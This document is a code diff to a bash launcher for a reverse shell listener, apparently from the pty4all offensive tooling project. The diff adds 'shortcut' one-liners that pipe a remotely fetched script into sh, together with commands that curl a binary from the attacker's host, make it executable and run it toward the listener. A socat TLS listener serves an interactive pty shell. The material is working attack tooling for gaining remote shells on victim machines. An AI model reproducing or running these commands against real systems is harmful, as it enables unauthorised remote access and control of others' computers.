@@ -1,6 +1,7 @@
 #!/bin/bash
 
 # From https://github.com/laluka/pty4all
+SHORTCUT=true
 
 for i in "$@"; do
     case $i in
@@ -21,6 +22,9 @@ for i in "$@"; do
         ;;
     --windows|-w)
         WINDOWS=true
+        ;;
+    --no-shortcuts|-N)
+        SHORTCUT="" # ~ setting at false
         ;;
     *)    
         ;;
@@ -72,18 +76,21 @@ cp ${SCRIPT}.tpl ${SCRIPT}
 
 # HTTP server launch
 if [[ "$GITAR" ]]; then
-    #gitar shortcut is not available with windows
-    if [[ ! $WINDOWS ]]; then
-        echo "[+] gitar shortcuts enabled on reverse shell"
-        sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
-        sed -i "s/GITAR_HOST/${LHOST}/g" ${SCRIPT}
-    fi
     echo "[+] launch gitar server"
     SECRET=$RANDOM
     tmux split-window -h "gitar -e ${LHOST} -p ${WEBPORT} --secret ${SECRET}"
+    ## Load gitar shortcuts (gitar shortcut is not available with windows, in fact --dry-run is,not yet implemented)
+    if [[ ! $WINDOWS ]]; then
+        echo "[+] gitar shortcuts enabled on reverse shell"
+        sed -i "s/GITAR_SECRET/${SECRET}/g" ${SCRIPT}
+        sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
+        sed -i "s/GITAR_HOST/${LHOST}/g" ${SCRIPT}
+    fi
 else
     echo "[+] gitar shortcuts  not enabled"
     tmux split-window -h "python3 -m http.server ${WEBPORT}"
+    # disable gitar shortcut
+    sed -i "/GITAR_SECRET/d" ${SCRIPT}
 fi
 
 # put tacos in current directory
@@ -108,11 +115,33 @@ fi
 
 
 # LISTEN
+REMOTE_CMD=""
+
+if [[ "$WINDOWS" ]]; then
+    REMOTE_CMD="curl -O $DOWNLOAD_URL && .\\${BINARY} ${LHOST}:${LPORT}"
+else
+    REMOTE_CMD="curl -s -O $DOWNLOAD_URL && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
+fi
+
+## with shorter shortcut?
+if [[ "$SHORTCUT" ]]; then
+    ## Write file for gitar
+    echo "${REMOTE_CMD}" > sh
+    SHORTCUT_URL="http://${LHOST}:${WEBPORT}"
+    if [[ "$GITAR" ]]; then
+        SHORTCUT_URL="${SHORTCUT_URL}/${SECRET}/pull/sh"
+    else
+        SHORTCUT_URL="${SHORTCUT_URL}/sh"
+    fi
+    REMOTE_CMD="\nsh -c \"\$(curl ${SHORTCUT_URL})\"\nsh <(curl ${SHORTCUT_URL})"
+    #curl ${SHORTCUT_URL} |sh\n does not work due to /pkg/tacos/tacos.go:94
+fi
+
 echo
 if [[ "$WINDOWS" ]]; then
-    echo "(🪟) curl -O $DOWNLOAD_URL && .\\${BINARY} ${LHOST}:${LPORT}"
+    echo -e "(🪟) ${REMOTE_CMD}"
     socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty
 else
-    echo "(🐧) curl -O $DOWNLOAD_URL && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
+    echo -e "(🐧) ${REMOTE_CMD}"
     socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty,raw,echo=0
 fi
